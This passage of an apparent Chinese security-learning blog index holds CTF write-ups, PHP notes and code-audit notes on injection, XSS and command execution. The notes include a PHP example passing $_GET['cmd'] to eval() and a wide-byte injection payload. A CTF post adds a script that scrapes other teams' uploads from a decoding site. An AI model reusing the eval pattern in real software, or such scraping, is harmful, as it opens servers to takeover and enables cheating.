​ var i, j; ​ for (i in replace_dict) { ​ j = replace_dict[i] ​ if (i == &#39;$upstream&#39;) { ​ i = upstream_domain ​ } else if (i == &#39;$custom_domain&#39;) { ​ i = host_name ​ } ​ ​ if (j == &#39;$upstream&#39;) { ​ j = upstream_domain ​ } else if (j == &#39;$custom_domain&#39;) { ​ j = host_name ​ } ​ ​ let re = new RegExp(i, &#39;g&#39;) ​ text = text.replace(re, j); ​ } ​ return text; } async function device_status(user_agent_info) { var agents = [&quot;Android&quot;, &quot;iPhone&quot;, &quot;SymbianOS&quot;, &quot;Windows Phone&quot;, &quot;iPad&quot;, &quot;iPod&quot;]; var flag = true; for (var v = 0; v &lt; agents.length; v++) { if (user_agent_info.indexOf(agents[v]) &gt; 0) { flag = false; break; } } return flag; }左上角项目名可以修改 然后点击保存并部署就可以了 可以先点击右边的预览查看效果 可以返回首页点击workers来管理 下面是我创建的镜像 http://gg.d1a0.workers.dev/ 虽然Cloudflare Workers 每天只有10万次免费的请求 ,不过也够个人使用了。","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"谷歌镜像","slug":"谷歌镜像","permalink":"http://lingxin16.github.io/tags/%E8%B0%B7%E6%AD%8C%E9%95%9C%E5%83%8F/"}]},{"title":"2020网鼎杯青龙组部分wp","slug":"2020网鼎杯青龙组部分wp","date":"2020-05-10T13:10:00.000Z","updated":"2020-07-15T09:53:17.248Z","comments":true,"path":"2020/05/10/2020网鼎杯青龙组部分wp/","link":"","permalink":"http://lingxin16.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/","excerpt":"第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555…","text":"第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555… misc签到misc签到题给的是个web容器，打开链接 根据上方战队名选择战队图片，有三次错误机会，猜的时间是十秒 当连续猜对15次之后需要输入战队token 输入token后在控制台找到flag crypto boom下载后是个boom.exe 放在cmd中运行 根据提示，解一次md5，输入结果 然后解三元一次方程 再解出x后得到flag(由于不会解，可以直接爆破得到x) crypto you raise me up下载附件后解压是个py脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- from Crypto.Util.number import * import random n = 2 ** 512 m = random.randint(2, n-1) | 1 c = pow(m, bytes_to_long(flag), n) print &#39;m = &#39; + str(m) print &#39;c = &#39; + str(c) # m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075 # c = 66658513942032142458567894507236586325208167916217967759097668952330002340 可以sage工具的discrete_log解 discrete_log(mod(c,n),mod(m,n))得56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757 然后用libnum模块解n2s import libnum flag = 56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757 print (libnum.n2s(flag)) 得到flag misc 虚幻二今天差不多全程都在解这个题，实在是不知道怎么拼出汉信码 下载完附件后用Stegsolve分析，保存green，red和blue三个图层 看不清可以放大处理一下 其中red和blue都是31 * 10的排列 green是31 * 11的排列方式，那么从green开始，按照green、blue、red循环的方式，每次用一行进行拼接，得到一个31 * 31的图像 然后需要将左上角7 * 7的方块旋转180°，再将整个图像逆时针旋转90° ，旋转之后图片上方有个7 * 10大小的空白区域，就是hint中所说的暴力恢复的地方 恢复之后如下图 在线扫码得到flag 扫码地址:http://www.efittech.com/hxdec.html 赛后还听说有的战队是直接爬了解码网站，把其他队伍上传的汉信码都爬了下来…emm 我研究了下确实是可行的，于是在@anweilx师傅的指导下也写了批量爬取的脚本在这里贴出来 #coding:utf–8 import requests for m in range (0,61): #取0分到60分 for s in range (0,61): #取0秒到60秒 url=&quot;http://www.efittech.com/upload/pics/pic_2020051013&quot; + &quot;%02d%02d&quot;%(m ,s )+&quot;.jpg&quot; #2020051013是时间格式13是13点 获取=requests.get(url)#获取网络请求信息 #获取网络图片二进制流 流=获取.content #将二进制流保存到图片文件中 if b&quot;\\xff\\xd8&quot; in 流: #判断该图片是否存在 file = open(&quot;./汉信码13/&quot; + &quot;%02d%02d&quot;%(m ,s ) +&quot;.jpg&quot;,&quot;wb&quot;) #将图片命名为分钟+秒数.jpg file.write(流) file.close() 第一次写，写的不好师傅们轻点打","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"比赛记录","slug":"比赛记录","permalink":"http://lingxin16.github.io/tags/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"}]},{"title":"代码审计day10","slug":"代码审计day10","date":"2020-03-26T13:36:00.000Z","updated":"2020-07-15T09:54:22.211Z","comments":true,"path":"2020/03/26/代码审计day10/","link":"","permalink":"http://lingxin16.github.io/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day10/","excerpt":"变量覆盖","text":"变量覆盖 变量覆盖是指变量未被初始化，我们可以自定义参数值替换程序原有的变量值 extract()变量覆盖int extract ( $array , extract_rules,prefix ) $array 关联的数组，受第二个和第三个参数的影响 extract_rules 对待非法/ 数字和冲突的键名的方法将根据取出标记 prefix 仅在第二个参数特殊时需要，添加前缀危险函数EXTR_OVERWRITE-默认。如果有冲突，则覆盖已有的变量。 EXTR_SKIP- 如果有冲突，不覆盖已有的变量。( 忽略数组中同名的元素) EXTR_PREFIX_SAME .如果有冲突，在变量名前加上前缀prefix。自PHP4.0.5起，这也包括了对数字索引的处理 EXTR_PREFIX_ALL- 给所有变量名加上前缀prefx (第三个参数) EXTR_PREFIX_INVALID -仅在非法或数字变量名前加上前缎prefix。本标记是PHP4.0.5新加的。 EXTR_IF_EXISTS- 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经定义了一组合法的变量，然后要从一个数组例如$_REQUEST中提取值覆盖这些变量的场合。本标记是PHP4.2.0新加的。 EXTR_PREFIX_IF_EXISTS-仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。本标记是PHP4.2.0新加的。 EXTR_REFS-将变量作为引用提取。这有力地表明了导入的变量仍然引用了var_array 参数的值。可以单独使用这个标志或者在extract_type中用OR与其它任何标志结合使用。本标记是PHP4.3.0新加的。parse_str()变量覆盖void parse_str ( string $encoded_string [, array &amp;$result] ) $encoded_string 输入的字符串 &amp;$result 变量将会以数组元素的形式存入到这个数组，作为替代import_request_variables()bool import_request_variables ( string $type [, string $prefix ] ) $type 指定需要导入的变量。可以用字母‘G&#39;、‘P&#39;和 ‘C‘分别表示GET、POST和Cookie $prefix 变量名前缀","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计day9","slug":"代码审计day9","date":"2020-03-25T13:49:00.000Z","updated":"2020-07-15T09:54:37.531Z","comments":true,"path":"2020/03/25/代码审计day9/","link":"","permalink":"http://lingxin16.github.io/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/","excerpt":"文件上传绕过","text":"文件上传绕过 服务端： 1.黑白名单过滤 2.修改MIME类型 3.截断上传攻击 4..htaccess文件攻击 5.目录验证 目录穿越目录穿越(Directory Traversal)攻击是黑客能够在Web应用程序所在的根目录以外的文件夹上,任意地存取被限制的文件夹、执行命令或查找数据。目录穿越攻击,也有人称为Path Traversal攻击。 绕过进行URL编码 进行16位Unicode编码 进行双倍URL编码 进行超长UTF-8 Unicode编码 文件包含文件包含漏洞的产生原因是在通过引入文件时,引用的文件名用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时,就形成的本地文件包含漏洞,被包涵的文件在第三方服务是,就形成了远程文件包含漏洞。 模块加载、cache调用,传入的参数拼接包含路径 include()使用此函数,只有代码执行到此函数时才将文件包含进来,发生错误时只警告并继续执行。 inclue_once0功能和前者一样,区别在于当重复调用同- -文件时,程序只调用一次。 require()使用此函数,只要程序执行,立即调用此函数包含文件,发生错误时,会输出错误信息并立即终止程序。 require_once()功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 远程包含利用方式 任意文件读取及删除文件读取 文件删除unlike()","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计day8","slug":"代码审计day8","date":"2020-03-24T14:14:00.000Z","updated":"2020-07-15T10:03:48.696Z","comments":true,"path":"2020/03/24/代码审计day8/","link":"","permalink":"http://lingxin16.github.io/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/","excerpt":"CSRF漏洞","text":"CSRF漏洞 CSRF ( Cross-site request forgery )跨站请求伪造,也有人写出XSRF。黑客伪造用户的HTTP请求。然后将这个HTTP请求发送给存在CSRF的网站,有CSRF的网站执行了伪造的HTTP请求,就引发了跨站请求伪造","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计day7","slug":"代码审计day7","date":"2020-03-23T12:38:56.000Z","updated":"2020-07-15T11:36:37.443Z","comments":true,"path":"2020/03/23/代码审计day7/","link":"","permalink":"http://lingxin16.github.io/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/","excerpt":"XSS漏洞","text":"XSS漏洞 跨站脚本攻击( Cross Site Scripting )是指攻击者利用网站程序对用户输入过滤不足,输入可以显示在页面上对其他用户造成影响的HTML代码,从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表( Cascading Style Sheets )的缩写CSS区分开,跨站脚本攻击通常简写为XSS。 常见场景搜索内容 发表文章 评论回复 资料设置 留言 常见类型反射型 存储型 DOM型 反射型XSS​ 非持久型,也叫反射型XSS。通过GET和POST方法,向服务器端输入数据。用户输入的数据通常被放置在URL的query string中,或者是form数据中。如果服务器端对输入的数据不进行过滤,验证或编码,就直接将用户输入的信息直接呈现给客户，则可能会造成反射型XSS。 ​ 反射型XSS是比较普遍的XSS ,其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重,如在输入框的name中输入 ,服务器不加处理,将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。 常见场景:●将前端获取的内容,直接输出到浏览器页面●将前端获取的内容,直接输出到HTML标签●将前端获取的内容，直接输出到标签 存储型XSS​ 持久型,也叫存储型XSS,通常是因为服务器端将用户输入的恶意脚本没有通过验证就直接存储在数据库,并且每次通过调用数据库的方式,将数据呈现在浏览器上。则该XSS跨站脚本攻击将一直存在。若其他用户访问该页面,则恶意脚本就会被触发,用于盗取其他用户的私人信息。 DOM型XSS​ DOM ,全称Document Object Model ,是一个平台和语言都中立的接口,可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。DOM型XSS其实是一种特殊类型的XSS ,它是基于DOM文档对象模型的一种漏洞。","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计day6","slug":"代码审计day6","date":"2020-03-22T13:40:00.000Z","updated":"2020-07-15T09:55:45.716Z","comments":true,"path":"2020/03/22/代码审计day6/","link":"","permalink":"http://lingxin16.github.io/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/","excerpt":"命令执行漏洞","text":"命令执行漏洞 命令注入是一种攻击，目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单、cookie、HTTP头等）传递给系统shell时，命令注入攻击是可能的。在这种攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的特权执行。命令注入攻击可能很大程度上是由于输入验证不足。 命令执行和代码执行的区别代码执行：执行的效果完全受限于语言本身 命令执行：执行的效果不受限于语言语法本身，不受命令本身限制 命令执行类型： 1.代码层过滤不严 2.系统漏洞 3.第三方组件存在代码执行漏洞 常见函数： system函数passthru函数Exec函数Shell_exec函数“ 1.system函数 string system( string $command[,int &amp;$return_var] ) $command 要执行的命令 $return_var 如果提供此参数，则外部命令执行后的返回状态将会被设置到此变量中 2.passthru函数 string passthru ( string $command [, int &amp;$return_var] ) $command 要执行的命令 $return_var 如果提供此参数，Unix命令的返回状态会被记录到此参数 3.Exec函数 string exec ( string $command [, array &amp;$output [, int &amp;$return var ]] ) $command 要执行的命令 $output 如果提供此参数，会有命令执行的输出填充此数组 $return_ var如果同时提供$output和$return_var参数，命令执行后的返回状态会被写入到此变量 4.Shell_exec函数 string shell_exec ( string $cmd ) $cmd 要执行的命令 反引号(`)则调用此函数 5.过滤函数 Escapeshellcmd() 过滤整条命令 Escapeshellarg() 过滤整个参数","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计day5","slug":"代码审计day5","date":"2020-03-21T15:15:00.000Z","updated":"2020-07-15T09:55:55.946Z","comments":true,"path":"2020/03/21/代码审计day5/","link":"","permalink":"http://lingxin16.github.io/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day5/","excerpt":"代码执行漏洞","text":"代码执行漏洞 代码执行漏洞是指应用程序本身过滤不严，用户可以通过请求将代码注入到应用中执行。当应用在调用一些能将字符串转化成代码的函数(如php中的eval)时，没有考虑到用户是否能控制这个字符串，将造成代码注入漏洞。狭义的代码注入通常指将可执行代码注入到当前页面中，如php的eval函数，可以将字符串代表的代码作为php代码执行，当前用户能够控制这段字符串时，将产生代码注入漏洞 常见函数eval和assert回调函数动态执行函数preg_replace函数 1.eval()、assert()将输入的字符串参数作为PHP程序代码来执行 2.回调函数mixed call_user_ func ( callable $callback [, mixed $parameter [, mixed $… ]])$callback是要调用的自定义函数名称$parameter是自定义函数的参数常见的回调函数:call_user_func()、call_user_func_array()、array_map()等 &lt;?php function callBack()[ $b = $_GET[&#39;cmd&#39;]; eval($b); ] call_user_func(function&#39;callBack&#39;,$b); ?&gt;3.动态执行函数 1.定义一个函数 2.将函数名(字符串)赋值给一个变量 3.使用变量名代替函数名动态调用函数4.preg_replace mixed preg_replace ( mixed $pattern,mixed $replacement , mixed $subject [, int $limit =-1 [, int &amp;$count]]) $pattern正则匹配的内容 $replacement用于替换的字符串或字符串数组 $subject要进行搜索和替换的字符串或字符串数组 $pattern存在/e模式修正符修饰 允许代码执行正则表达式正则表达式语法规则 普通字符作为原子 限定符 特殊符号作为原子 边界限制符 通用字符类型作为原子 后向引用 自定义原子表作为原子","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计day4","slug":"代码审计day4","date":"2020-03-20T14:22:00.000Z","updated":"2020-07-15T09:56:20.641Z","comments":true,"path":"2020/03/20/代码审计day4/","link":"","permalink":"http://lingxin16.github.io/2020/03/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day4/","excerpt":"宽字节注入","text":"宽字节注入 因为%df的关系, \\的编码%5c被吃掉了,也就失去了转义的效果,直接被带入到mysql中,然后mysql在解读时无视了%a0%5c形成的新字节，那么单引号便重新发挥了效果 原理:%df%27===&gt; (addslashes)====&gt; %df%5c%27====&gt;(GBK)====&gt;運’用户输入===&gt;过滤函数===&gt;代码层的$sql==&gt; mysql处理请求= =&gt;mysql中的sql默认编码character set_ client== &gt;根据character. set connection转码== &gt;更新数据库时转化成字段所对应的编码 修复方案:(1)使用mysql_set_charset(GBK)指定字符集(2)使用mysql _real_escape_string进行转义 二次注入注入点因为经过过滤处理无法触发sql注入漏洞,比如addslashes函数,将单引号等字符转义变成,但是存进数据库后，数据又被还原，在这种情况下。如果发现一个新的注入同时引用了被插入的数据库数据，就可以实现闭合新发现的注入漏洞引发二次注入(先将注入语句插入到数据库中，然后再触发语句) 一阶注入:1.一阶SQL注 入发生在一个HTTP请求和响应中 ,对系统的攻击是立即执行的2.攻击者在http请求中提交非法输入3.应用程序处理非法输入。使用非法输入构造SQL语句4.在攻击过程中向攻击者返回结果二阶注入:1.攻击者在http请求中提交恶意输入2.恶意输入保存在数据库中3.攻击者提交第二次http请求4.为处理第二次http请求,程序在检索存储在数据库中的恶意输入，构造SQL语句5.如果攻击成功,在第二次请求响应中返回结果","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计day3","slug":"代码审计day3","date":"2020-03-19T14:38:00.000Z","updated":"2020-07-15T09:56:31.108Z","comments":true,"path":"2020/03/19/代码审计day3/","link":"","permalink":"http://lingxin16.github.io/2020/03/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day3/","excerpt":"代码审计Sql注入漏洞","text":"代码审计Sql注入漏洞 注入类型：数字型、字符型，这两种都包括以下几种注入 post注入、cookie注入、宽字节注入、二次注入、盲注、base64注入、探索注入 数字型：当输入的参数为整型时，则可认为是数字型注入 $result = “select * from admin where id=$id”; 不需要单引号来闭合 字符型：当输入的参数为字符串时，称之为字符型注入 $result = “select * from admin where id=’$id’ ”; 需要单引号来闭合","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计day2","slug":"代码审计day2","date":"2020-03-18T13:32:00.000Z","updated":"2020-07-15T09:56:42.228Z","comments":true,"path":"2020/03/18/代码审计day2/","link":"","permalink":"http://lingxin16.github.io/2020/03/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day2/","excerpt":"代码调试echo ​ 最简单的输出数据调试方法，一般用来输出变量值或者不确定执行到哪个分支","text":"代码调试echo ​ 最简单的输出数据调试方法，一般用来输出变量值或者不确定执行到哪个分支 print_r、var_dump、debug_zval_dump ​ 输出变量的数据值，特别是数组和对象数据，一半在查看接口的返回值或者不确定的变量可以使用这两个api，debug_zval_dump输出结果和var_dump类似，位移增加的值是refcount，记录一个变量被引用了多少次 debug_print_backtrace ​ 可以查看输出的调用栈信息 exit() ​ 停止程序，无法运行后面代码 超全局变量全局变量 ​ 全局变量就是在函数外面定义的变量。不能在函数中直接使用。因为它的作用域不会到函数内部。所以在函数内部使用的时候常常看到类似global $a; 超全局变量 ​ 超全局变量作用域在所有脚本都有效。所以,在函数可直接使用。比如$_ GET，$. SERVER都是超全局变量。除$GET, $. _POST,$ SERVER, $_ COOKIE等之外的超全局变量保存在$GLOBALS数组中 $GLOBALS $_REQUEST $_GET $_ENV $_SESSION $_SERVE $_POST $_FILES $_COOKIS","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计day1","slug":"代码审计day1","date":"2020-03-17T13:48:00.000Z","updated":"2020-07-15T09:56:52.916Z","comments":true,"path":"2020/03/17/代码审计day1/","link":"","permalink":"http://lingxin16.github.io/2020/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day1/","excerpt":"魔术引号自动过滤","text":"魔术引号自动过滤 magic_quotes_gpc= on (在PHP5.4.0中被移除) 如果是开启状态，那么将自动对用户提交的sql语句进行转义 会把所有的单引号(“’’”)双引号(““””)反斜杠(”\\“)和空字符(NULL)加上反斜杠进行转义 可以使用addslashes来转义提交的请求，或者用stripslashes来删除转义 远程文件是否允许包含远程文件allow_url_include= off 是否允许打开远程文件allow_url_open= on 目录权限HTTP头部版本信息expose_php = off 防止通过http头部泄露php的版本信息 文件上传临时目录upload_tmp_dir= 上传文件临时保存的目录，如果不设置的话，则采用系统的临时目录 用户可访问目录open_basedir = 能够控制PHP脚本只能访问指定目录","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"php学习day5","slug":"php学习day5","date":"2020-03-16T12:54:00.000Z","updated":"2020-07-15T09:57:04.661Z","comments":true,"path":"2020/03/16/php学习day5/","link":"","permalink":"http://lingxin16.github.io/2020/03/16/php%E5%AD%A6%E4%B9%A0day5/","excerpt":"流程控制","text":"流程控制 流程控制：代码执行的方向 控制分类顺序结构：代码从上往下，顺序执行。（代码执行的最基本结构） 分支结构：给定一个条件，同时有多种可执行代码(块)，然后根据条件执行某一段代码 循环结构：在某个条件控制范围内，指定的代码(块)可以重复执行 顺序结构顺序结构:最基本结构，所有代码默认都是从上往下依次执行 分支结构在PHP中，分支结构主要有两种: if 分支和switch分支 if分支最简if： if(条件表达式){ ​ //满足条件所要执行的内容；顺序结构 } 基础if if(条件表达式){ ​ //满足条件所要执行的内容； }else{ ​ //不满足条件所要执行的代码段 } 复杂if结构 if(条件表达式1){ ​ //满足表达式1的代码段； }elseif(条件表达式2){ ​ //不满足表达式1的代码段，但是满足表达式2的代码段； } //可是使用多个elseif来判断 else{ ​ //全部不满足要执行的代码 }","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php","slug":"php","permalink":"http://lingxin16.github.io/tags/php/"}]},{"title":"php学习day4","slug":"php学习day4","date":"2020-03-15T13:52:00.000Z","updated":"2020-07-15T09:56:09.498Z","comments":true,"path":"2020/03/15/php学习day4/","link":"","permalink":"http://lingxin16.github.io/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/","excerpt":"计算机码","text":"计算机码 计算机码：计算机在实际存储数据的时候，采用的编码规则（二进制规则） 计算机码：原码、反码和补码，数值本身最左边一位是符号位，正数为0，负数为1 原码：数据本身从十进制转换成二进制得到的结果 ​ 正数：左边符号位为0 (正数的原码、反码和补码就是原码本身) ​ 负数：左边符号位为1 反码：针对负数，符号位不变，其他位取反(01转换) 补码：针对负数，反码+1 系统中存在两个0：+0和-0 +0:00000000 -0:10000000 原码 取反：11111111 补码：00000000 位运算符位运算:取出计算机中最小的单位(位bit)进行运算 &amp;：按位与，两个位都为1，结果为1，否则为0 |：按位或，两个有一-个为1，结果为1 ~：按位非，一个位如果为1则变成0，否则反之 ^：按位异或，两个相同则为0,不同则为1 &lt;&lt;：按位左移，整个位(32位), 向左移动一位，右边补0 &gt;&gt;：按位右移，整个位向右移动一位，左边补符号位对应内容(正数补0，负数补1)计算机进行任何位运算时使用的是补码 运算结束之后都必须转换成原码才是最终要显示的数据 按位左移：乘以2的操作 按位右移：除以2的操作 运算符优先级运算符优先级:在多种运算符同时存在的时候，如何结合运算","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php","slug":"php","permalink":"http://lingxin16.github.io/tags/php/"}]},{"title":"Python安装双版本","slug":"Python安装双版本","date":"2020-03-15T09:37:00.000Z","updated":"2020-07-15T09:57:22.000Z","comments":true,"path":"2020/03/15/Python安装双版本/","link":"","permalink":"http://lingxin16.github.io/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/","excerpt":"Python的环境部署一直是有问题，今天就想个办法把这个问题解决了 同时安装Python2和Python3的版本并配置环境变量","text":"Python的环境部署一直是有问题，今天就想个办法把这个问题解决了 同时安装Python2和Python3的版本并配置环境变量 在官网下载Python2和Python3的安装包 安装Python2和Python3的时候都勾选add to path(配置环境变量) 然后在Python2文件夹里把python.exe改为python2.exe 同理在scripts文件夹下把pip.exe分别改为pip2.exe 这个时候测试的话pip2 -V命令会报错 我们在官网下载pip安装包，cmd中cd命令进入安装文件 然后python2 setup.py install ok！","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"环境配置","slug":"环境配置","permalink":"http://lingxin16.github.io/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}]},{"title":"php学习day3","slug":"php学习day3","date":"2020-03-14T14:13:00.000Z","updated":"2020-07-15T11:20:12.253Z","comments":true,"path":"2020/03/14/php学习day3/","link":"","permalink":"http://lingxin16.github.io/2020/03/14/php%E5%AD%A6%E4%B9%A0day3/","excerpt":"浮点类型","text":"浮点类型 浮点型：小数类型以及超过整型所能存储范围的整数 浮点型定义： $f=1.23; $f=1.23e10; //科学计数法，其中e表示低10 1.23×10^10浮点数不够精确 布尔类型两个值：true和false 通常用于判断 在进行某些数据判断的时候，需要特别注意类型转换 Empty()：判断数据的值是否为“空”，而不是NULL，如果为空返回true，不为空返回false lsset()：判断数据存储的变量本身是否存在，存在变量返回true，不存在返回false 运算符运算符：operator，是一种将数据进行运算的特殊符号，在php中一共有十种运算符之多 赋值运算符赋值运算：符号是“=”，表示将右边的结果(可以是变量、数据、常量和其他运算出来的结果)，保存到内存的某个位置，然后将位置的内存地址赋值给左侧的变量(常量) 算术运算符+：执行数据累加-：数据相减*：两个数相乘/：两个数相除%：取余运算，两个数(整数)相除保留余数 在进行除法运算或取余运算时后边的数不能为零 比较运算符比较运算：比较两个数据的大小，或者两个内容是否相同 &gt;：左边大于右边，返回true &gt;=：左边大于等于右边，返回true &lt;：左边小于右边，返回true &lt;=：左边小于等于右边，返回true ==：左边与右边的相同（大小相同），返回true !=：左边与右边的不同（大小不相同），返回true ===：全等于 左边与右边的相同（大小以及数据的类型都要相同） !==：不全等于 左边与右边的不相同（大小或数据的类型不同）逻辑运算符逻辑运算：针对不同的结果进行匹配 &amp;&amp;：逻辑与 左边的条件与右边的条件同时成立（两边结果都为true） ||：逻辑或 左边的条件嚯右边的条件只要有一个满足即可 ！：逻辑非 对已有条件进行取反逻辑与和逻辑或又称为短路运算：如果第-一个表达式结果已经满足条件了，那么就不会运行逻辑运算符后面的表达式 在书写代码的时候，尽量将出现概率最高的(能够直接判断出结果)的表达式放到第一位 连接运算符连接运算:是PHP中将多个字符串拼接的一种符号 .：将两个字符串连接到一起 .=：复合运算，将左边的内容与右边的内容连接起来，然后重新赋值给左边变量错误抑制符在PHP中有一些错误可以提前预知，但是这些错误可能无法避免，但是又不希望报错给用户看，可以使用错误抑制符处理 @：在可能出错的表达式前面使用@符号即可 @(可能出错的代码);三目运算符三目运算:有三个表达式参与的运算(简单的的分支结构缩写)。 语法格式: 表达式1 ? 表达式2 : 表达式3;（如果表达式1成立，那么执行表达式2，否则执行表达式3） 自操作运算符++ --后置自操作运算符$a++ 前置自操作运算符++$a b=$a++ 先赋值再运算 b=++$a 先运算再赋值 衍生符号：类似自操作 +=：左边的结果与右边的结果相加，然后赋值给左边-=：左边的减去右边的结果，然后赋值给左边*=：乘法操作/=：除法操作%=：模操作 